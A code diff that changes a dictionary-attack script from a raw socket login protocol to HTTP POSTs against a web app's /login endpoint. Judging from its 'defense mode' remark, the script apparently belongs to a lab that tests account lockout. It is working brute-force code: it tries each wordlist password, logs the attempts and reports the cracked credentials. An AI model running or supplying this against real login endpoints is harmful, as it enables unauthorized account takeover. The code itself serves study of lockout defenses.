@@ -1,24 +1,31 @@
-"""Dictionary attack: many candidate passwords tried against one account."""
+"""Dictionary attack: many candidate passwords tried against one account
+on the webapp's /login endpoint.
+
+Response signals used to interpret each attempt (matches app.py):
+    HTTP 302 -> success (redirected to /dashboard)
+    HTTP 429 -> account locked (defense mode only)
+    HTTP 200 -> failed login
+"""
 import argparse
 import os
-import socket
 import time
 
+import requests
 
-def try_login(host, port, username, password, timeout=3.0):
-    with socket.create_connection((host, port), timeout=timeout) as s:
-        f = s.makefile("rwb", buffering=0)
-        f.write(f"USER {username}\n".encode())
-        f.readline()
-        f.write(f"PASS {password}\n".encode())
-        reply = f.readline().decode(errors="replace").strip()
-    return reply
+
+def try_login(base_url, username, password, timeout=5.0):
+    resp = requests.post(
+        f"{base_url}/login",
+        data={"username": username, "password": password},
+        allow_redirects=False,
+        timeout=timeout,
+    )
+    return resp.status_code
 
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--host", required=True)
-    parser.add_argument("--port", type=int, required=True)
+    parser.add_argument("--url", required=True, help="e.g. http://192.168.56.20:5000")
     parser.add_argument("--user", required=True)
     parser.add_argument("--wordlist", required=True)
     parser.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attacker_dict.log"))
@@ -33,19 +40,19 @@ def main():
     start = time.time()
     for i, password in enumerate(candidates, 1):
         try:
-            reply = try_login(args.host, args.port, args.user, password)
-        except OSError as e:
-            reply = f"ERROR {e}"
+            status = try_login(args.url, args.user, password)
+        except requests.RequestException as e:
+            status = f"ERROR {e}"
         elapsed = time.time() - start
-        line = f"[{elapsed:7.3f}s] attempt={i} user={args.user} password={password!r} -> {reply}"
+        line = f"[{elapsed:7.3f}s] attempt={i} user={args.user} password={password!r} -> HTTP {status}"
         print(line)
         logf.write(line + "\n")
 
-        if reply.startswith("230"):
+        if status == 302:
             print(f"\nSUCCESS: {args.user}:{password}  ({i} attempts, {elapsed:.2f}s)")
             logf.write(f"CRACKED user={args.user} password={password} attempts={i} time={elapsed:.2f}s\n")
             break
-        if reply.startswith("503"):
+        if status == 429:
             print(f"\nACCOUNT LOCKED after {i} attempts ({elapsed:.2f}s) - dictionary attack blocked")
             logf.write(f"LOCKED_OUT user={args.user} attempts={i} time={elapsed:.2f}s\n")
             break
